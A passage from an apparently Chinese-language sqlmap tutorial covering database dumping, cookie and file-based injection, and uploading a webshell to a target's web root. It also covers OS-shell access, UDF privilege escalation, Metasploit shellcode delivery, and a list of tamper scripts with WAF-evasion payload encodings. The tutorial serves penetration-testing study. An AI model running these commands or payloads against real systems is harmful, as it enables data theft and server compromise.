</span></span><span class="line"><span class="cl">--schema				<span class="c1">#枚举出 DBMS 所有模式</span>
</span></span><span class="line"><span class="cl">--count					<span class="c1">#获取数据表数目</span>
</span></span><span class="line"><span class="cl">--dump-all				<span class="c1">#如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目</span>
</span></span><span class="line"><span class="cl">--dump					<span class="c1">#导出 DBMS 数据库表项</span>
</span></span><span class="line"><span class="cl">--search，-C，-T，-D		<span class="c1">#此开关允许你在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名</span>
</span></span><span class="line"><span class="cl">--stop 10				<span class="c1">#只取前10行数据</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">-D DB					<span class="c1">#指定要枚举的 DBMS 数据库</span>
</span></span><span class="line"><span class="cl">-T TBL					<span class="c1">#指定要枚举的 DBMS 数据表</span>
</span></span><span class="line"><span class="cl">-C COL					<span class="c1">#指定要枚举的 DBMS 数据列</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">--sql-query<span class="o">=</span>QUERY		<span class="c1">#指定要执行的 SQL 语句</span>
</span></span><span class="line"><span class="cl">--sql-shell				<span class="c1">#调出交互式 SQL shell</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="用例">用例</h3>
<h4 id="指定数据包注入">指定数据包注入</h4>
<ul>
<li>从文件读取HTTP请求，GET和POST都可以</li>
</ul>
<p><code>sqlmap -r &quot;burp.txt&quot; -p &quot;username&quot;	#-p 指定存在注入的参数</code></p>
<p>这里的 txt 文件就是完整的 http 请求包，可以使用 -p 指定参数，也可以在 txt 文件中使用 *（星号）定位，特别是注入点后需要使用闭合语句的情况下</p>
<ul>
<li>Cookie注入</li>
</ul>
<p><code>sqlmap -u &quot;http://www.vuln.com&quot; --cookie &quot;id=11&quot; --level 2</code></p>
<ul>
<li>当防火墙对请求速度做了限制</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://www.vuln.com/post.php?id=1&#34; --delay=10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 在每个HTTP请求之间的延迟10秒
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="伪静态注入">伪静态注入</h4>
<p><code>sqpmap  -u http://victim.com/id/666*.html --dbs  #在html扩展名前加个'*'</code></p>
<p>暴力破解
当数据库为以下情况时，需要暴力破解表名和列名</p>
<ul>
<li>DBMS（Database Management System，数据库管理系统）是 &lt; 5.0 版本的 MySQL，它们不具备 information_schema</li>
<li>DBMS 是微软的 Access 数据库，并且其中的系统表 MSysObjects 默认设置不可读</li>
<li>当前会话用户对 DBMS 中存储数据表定义的系统表没有读权限</li>
</ul>
<p><strong>暴力破解表名</strong></p>
<p>只要开启了 <code>--common-tables</code>，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表，常见的数据表名列表存储在 <code>txt/common-tables.txt</code>，支持用户进行任意修改</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python sqlmap.py -u <span class="s2">&#34;http://192.168.136.129/mysql/get_int_4.php?id=1&#34;</span> --common-tables -D testdb
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="暴力破解列名">暴力破解列名</h4>
<p>开启了 &ndash;columns 开关，sqlmap 则会提示你是否使用暴力破解技术。因而，就算出现上面两个场景之一，只要你开启了 &ndash;common-columns，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表列名，常见的数据表名列表存储在 txt/common-columns.txt，支持用户进行任意修改</p>
<h4 id="文件操作">文件操作</h4>
<p>仅对MySQL、MSSQL、PostgreSQL有效，可以进行文件操作</p>
<p>前提：</p>
<ul>
<li>数据库用户有读写权限</li>
<li>有目录读写文件权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sqlmap -u url --is-dba
</span></span><span class="line"><span class="cl"><span class="c1">#查看是否dba权限,必须为root权限</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sqlmap -u url --file-read <span class="s2">&#34;C:/Windows/win.ini&#34;</span>		
</span></span><span class="line"><span class="cl"><span class="c1">#读取文件</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sqlmap -u url --file-write<span class="o">=</span>D:/shell.php --file-dest<span class="o">=</span>C:/www/shell.php
</span></span><span class="line"><span class="cl"><span class="c1">#上传文件 (本地木马路径:目标网站目录)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="执行命令">执行命令</h4>
<p>仅对MySQL、MSSQL、PosgreSQL有效</p>
<p>前提：</p>
<ul>
<li>数据库用户有读写权限</li>
<li>有目录读写文件权限</li>
</ul>
<p>sqlmap 能够在<strong>数据库所在服务器的操作系统上运行任意的命令</strong></p>
<p><code>sqlmap -u &quot;URL&quot; --os-shell	#获取系统交互shell或--os-cmd=id执行系统命令</code></p>
<p>原理就是上传一个 upload 木马后，再上传一个cmd shell</p>
<p>当 &ndash;os-shell退出后， 会调用后门脚本删除上传文件后，进行自删除</p>
<ul>
<li>在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数</li>
</ul>
<p>分别为 sys_exec() 和 sys_eval() 的共享库（二进制文件），然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。</p>
<ul>
<li>在 Microsoft SQL Server 中，sqlmap 会利用 xp_cmdshell 存储过程：</li>
</ul>
<p>如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；如果该存储过程不存在，sqlmap 则会重新创建它，当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。</p>
<ul>
<li>如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，假如后端 DBMS 和 Web 服务器在同一台服务器上，则仍可以通过利用 SELECT 语句中的 INTO OUTFILE，在 根目录可写目录中写shell</li>
</ul>
<h4 id="udf提权">UDF提权</h4>
<p>可以通过编译 MySQL 或 PostgreSQL 共享库（在 Windows 上为 DLL，在 Linux/Unix 上为共享对象（shared object））来注入自己的用户自定义函数（UDFs），然后将本地存储共享库的目录路径提供给 sqlmap。sqlmap 会根据你的选择决定下一步是向数据库服务器文件系统上传共享库到还是创建用户自定义函数。当你完成注入 UDFs 的使用后，sqlmap 还可以将它们从数据库中删除</p>
<p>使用选项 &ndash;udf-inject 并按照说明进行操作即可；如果需要，也可以使用 &ndash;shared-lib 选项通过命令行指定共享库的本地文件系统路径，否则 sqlmap 会在运行时向你询问路径</p>
<p>此功能仅对 MySQL 或 PostgreSQL 有用</p>
<p>有状态带外连接：Meterpreter &amp; friends
开关和选项：&ndash;os-pwn，&ndash;os-smbrelay，&ndash;os-bof，&ndash;priv-esc，&ndash;msf-path 和 &ndash;tmp-path</p>
<p>当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server 时，并且当前会话用户拥有对数据库特定功能和架构缺陷的利用权限时，sqlmap 能够在攻击者机器与数据库服务器之间建立起有状态带外 TCP 连接。根据用户的选择，该连接可以是交互式命令行、Meterpreter 会话、或者图形用户界面（VNC）会话</p>
<p>sqlmap 依赖 Metasploit 创建 shellcode，并实现了四种不同的技术在数据库服务器上执行它。这些技术分别是：</p>
<ul>
<li>
<p>通过 sqlmap 的用户自定义函数 sys_bineval() 在数据库内存中执行 Metasploit shellcode。MySQL 和 PostgreSQL 支持该技术，通过开关 &ndash;os-pwn 启用</p>
</li>
<li>
<p>通过 sqlmap 的用户自定义函数 sys_exec() 向 MySQL 和 PostgreSQL 上传一个 Metasploit 独立 payload 传输器并执行，对于 Microsoft SQL Server 则是使用 xp_cmdshell() 函数，通过开关 &ndash;os-pwn 启用</p>
</li>
<li>
<p>通过进行从数据库服务器到攻击者机器（由 Metasploit smb_relay 服务监听）之间的 UNC 路径请求的 SMB 反射攻击（MS08-068）来执行 Metasploit shellcode。当 sqlmap 运行于具有高权限（uid=0）的 Linux/Unix 上，且目标 DBMS 以 Windows 管理员身份运行时支持该技术，通过开关 &ndash;os-smbrelay 启用</p>
</li>
<li>
<p>通过利用 Microsoft SQL Server 2000 和 2005 的 sp_replwritetovarbin 存储过程堆缓冲区溢出（MS09-004）在数据库内存中执行 Metasploit shellcode。sqlmap 使用自己的 exploit，自动绕过 DEP 内存保护来触发漏洞，但它依赖 Metasploit 生成 shellcode，以便在成功利用时执行，通过开关 &ndash;os-bof 启用</p>
</li>
</ul>
<h4 id="访问-windows-注册表">访问 Windows 注册表</h4>
<p>条件：</p>
<ul>
<li>DBMS（Database Management System，数据库管理系统）是 MySQL，PostgreSQL 或 Microsoft SQL Server</li>
<li>Web 应用程序支持堆叠查询</li>
<li>会话用户必须具备相应的访问权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">--reg-read		<span class="c1">#读取 Windows 注册表键值</span>
</span></span><span class="line"><span class="cl">--reg-add		<span class="c1">#写入 Windows 注册表键值</span>
</span></span><span class="line"><span class="cl">--reg-del		<span class="c1">#删除 Windows 注册表项</span>
</span></span><span class="line"><span class="cl">--reg-key，--reg-value，--reg-data 和 --reg-type <span class="c1">#注册表辅助选项</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="常规选项">常规选项</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">-s			<span class="c1">#从已存储（.sqlite）文件读取会话</span>
</span></span><span class="line"><span class="cl"><span class="c1">#qlmap 会在专用的输出目录中自动为每一个目标分别建立持久会话 SQLite 文件，该文件会存储用于恢复会话的所有数据。如果用户需要指定会话文件的具体存储位置（例如：将所有目标的会话数据存储在同一个位置），则可以使用这个选项</span>
</span></span><span class="line"><span class="cl">-t			<span class="c1">#记录 HTTP(s) 访问信息到文本文件,这个选项需要一个指定文本文件地址的参数，用于写入 sqlmap 产生的所有 HTTP(s) 流量信息——包括 HTTP(S) 请求 和 HTTP(S) 响应</span>
</span></span><span class="line"><span class="cl">--batch		<span class="c1">#以非交互式模式运行,当 sqlmap 需要用户输入信息时，都将会以默认参数运行</span>
</span></span><span class="line"><span class="cl">--update	<span class="c1">#更新 sqlmap</span>
</span></span><span class="line"><span class="cl">--flush-session <span class="c1">#清空会话文件</span>
</span></span><span class="line"><span class="cl">更多选项：
</span></span><span class="line"><span class="cl">https://sqlmap.campfire.ga/usage/general
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="tamper脚本">Tamper脚本</h3>
<p>此部分转载自li qun师傅博客：https://ailiqun.xyz/2020/06/15/tamper</p>
<p>tamper 脚本可以用来对 sqlmap 的 sql 查询语句进行一次处理，让其绕过过滤，tamper 脚本在 sqlmap 安装目录的 tamper 目录下</p>
<p><code>use age：sqlmap.py --tamper=&quot;模块名.py&quot;</code></p>
<p>tamper 适用的数据库类型 &amp; 版本</p>
<h4 id="自带tamper介绍">自带tamper介绍</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apostrophemask.py
</span></span><span class="line"><span class="cl">功能：对引号进行 utf-8 格式编码 (% EF% BC%87)
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1 AND ‘1’=’1 ==&gt; 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">apostrophenullencode.py
</span></span><span class="line"><span class="cl">功能：用非法的双 unicode 字符 (%00%27) 替换引号字符
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1 AND ‘1’=’1 ==&gt; 1 AND %00%271%00%27=%00%271
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">appendnullbyte.py
</span></span><span class="line"><span class="cl">功能：在有效载荷结束位置加载零字节字符编码
</span></span><span class="line"><span class="cl">平台：Microsoft Access
</span></span><span class="line"><span class="cl">举例：1 AND 1=1 ==&gt; 1 AND 1=1%00
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">base64encode.py
</span></span><span class="line"><span class="cl">功能：用 base64 格式进行编码
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1’ AND SLEEP (5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">between.py
</span></span><span class="line"><span class="cl">功能：用 between 替换大于号（&gt;）
</span></span><span class="line"><span class="cl">平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0
</span></span><span class="line"><span class="cl">举例：
</span></span><span class="line"><span class="cl">1 AND A &gt; B –  ==&gt; 1 AND A NOT BETWEEN 0 AND B  –
</span></span><span class="line"><span class="cl">1 AND A = B –  ==&gt; 1 AND A BETWEEN B AND B –
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bluecoat.py
</span></span><span class="line"><span class="cl">功能：对 SQL 语句替换空格字符为 (%09)，并替换”=”—&gt;”LIKE”
</span></span><span class="line"><span class="cl">平台：MySQL 5.1, SGOS
</span></span><span class="line"><span class="cl">举例：SELECT username FROM users WHERE id = 1 ==&gt; SELECT%09username FROM%09users WHERE%09id LIKE 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">apostrophemask.py
</span></span><span class="line"><span class="cl">功能：用 utf-8 格式编码引号 (如：% EF% BC%87)
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1 AND ‘1’=’1 ==&gt; 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">charunicodeencode.py
</span></span><span class="line"><span class="cl">功能：对字符串进行 Unicode 格式转义编码
</span></span><span class="line"><span class="cl">平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET
</span></span><span class="line"><span class="cl">举例：SELECT FIELD%20FROM TABLE ==&gt; % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">charencode.py
</span></span><span class="line"><span class="cl">功能：采用 url 格式编码 1 次
</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chardoubleencode.py
</span></span><span class="line"><span class="cl">功能：采用 url 格式编码 2 次
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commalessmid.py
</span></span><span class="line"><span class="cl">功能：将 payload 中的逗号用 from 和 for 代替，用于过滤了逗号并且是 3 个参数的情况
</span></span><span class="line"><span class="cl">平台：MySQL 5.0, 5.5
</span></span><span class="line"><span class="cl">举例：MID (VERSION (), 1, 1) ==&gt; MID (VERSION () FROM 1 FOR 1)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">concat2concatws.py
</span></span><span class="line"><span class="cl">功能：CONCAT () ==&gt; CONCAT_WS ()，用于过滤了 CONCAT () 函数的情况
</span></span><span class="line"><span class="cl">平台： MySQL 5.0
</span></span><span class="line"><span class="cl">举例：CONCAT (1,2) ==&gt; CONCAT_WS (MID (CHAR (0),0,0),1,2)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">equaltolike.py
</span></span><span class="line"><span class="cl">功能：= ==&gt; LIKE，用于过滤了等号”=” 的情况
</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5
</span></span><span class="line"><span class="cl">举例：SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">greatest.py
</span></span><span class="line"><span class="cl">功能：&gt; ==&gt; GREATEST
</span></span><span class="line"><span class="cl">平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
</span></span><span class="line"><span class="cl">举例：1 AND A &gt; B ==&gt; 1 AND GREATEST (A, B+1)=A
</span></span><span class="line"><span class="cl">a 和 b+1 比较，取两者中的最大值为 a；则 a &gt;= b+1，亦即 a &gt; b
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">halfversionedmorekeywords.py
</span></span><span class="line"><span class="cl">功能：空格 ==&gt; / !0 （在关键字前添加注释）
</span></span><span class="line"><span class="cl">平台：MySQL 4.0.18, 5.0.22（Mysql &lt; 5.1）
</span></span><span class="line"><span class="cl">举例：union ==&gt; /!0union
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ifnull2ifisnull.py
</span></span><span class="line"><span class="cl">功能：IFNULL (A, B) ==&gt; IF (ISNULL (A), B, A)
</span></span><span class="line"><span class="cl">平台：MySQL 5.0 and 5.5
</span></span><span class="line"><span class="cl">举例：IFNULL (1, 2) ==&gt; IF (ISNULL (1),2,1)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">informationschemacomment.py
</span></span><span class="line"><span class="cl">功能：
</span></span><span class="line"><span class="cl">在 information_schema 后面加上 // ，用于绕过对 information_schema 的情况
</span></span><span class="line"><span class="cl">retVal = re.sub(r”(?i)(information_schema).”, “g&lt;1&gt;/ /.”, payload)
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：select table_name from information_schema.tables ==&gt; select table_name from information_schema/**/.tables
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lowercase.py
</span></span><span class="line"><span class="cl">功能：将 payload 里的大写转为小写
</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
</span></span><span class="line"><span class="cl">举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">modsecurityversioned.py
</span></span><span class="line"><span class="cl">功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf
</span></span><span class="line"><span class="cl">平台：MySQL 5.0
</span></span><span class="line"><span class="cl">举例：1 AND 2&gt;1–  ==&gt; 1 /!30874AND 2&gt;1/–
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">modsecurityzeroversioned.py
</span></span><span class="line"><span class="cl">功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似
</span></span><span class="line"><span class="cl">平台：Mysql
</span></span><span class="line"><span class="cl">举例：1 and 2&gt;1–+ ==&gt; 1 /!00000and 2&gt;1/–+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">multiplespaces.py
</span></span><span class="line"><span class="cl">功能：围绕 SQL 关键字添加多个空格
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1 UNION SELECT foobar ==&gt; 1   UNION   SELECT   foobar
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nonrecursivereplacement.py
</span></span><span class="line"><span class="cl">功能：关键字双写，可用于关键字过滤
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1 UNION SELECT 2–  ==&gt; 1 UNIONUNION SELESELECTCT 2–
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">overlongutf8.py
</span></span><span class="line"><span class="cl">功能： 转换给定的 payload 当中的所有字符
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT% C0% AAFIELD% C0% AAFROM% C0% AATABLE% C0% AAWHERE% C0% AA2% C0% BE1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">percentage.py
</span></span><span class="line"><span class="cl">功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个 (%)
</span></span><span class="line"><span class="cl">平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM TABLE ==&gt; % S% E% L% E% C% T % F% I% E% L% D % F% R% O% M % T% A% B% L% E
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">randomcase.py
</span></span><span class="line"><span class="cl">功能：将 payload 随机大小写
</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
</span></span><span class="line"><span class="cl">举例：INSERT ==&gt; InseRt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">randomcomments.py
</span></span><span class="line"><span class="cl">功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤
</span></span><span class="line"><span class="cl">平台：Mysql
</span></span><span class="line"><span class="cl">举例：INSERT ==&gt; I / ** / N / ** / SERT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">securesphere.py
</span></span><span class="line"><span class="cl">功能：在 payload 后追加特殊构造的字符串
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2comment.py
</span></span><span class="line"><span class="cl">功能：用注释符 // 代替空格，用于空格的绕过
</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
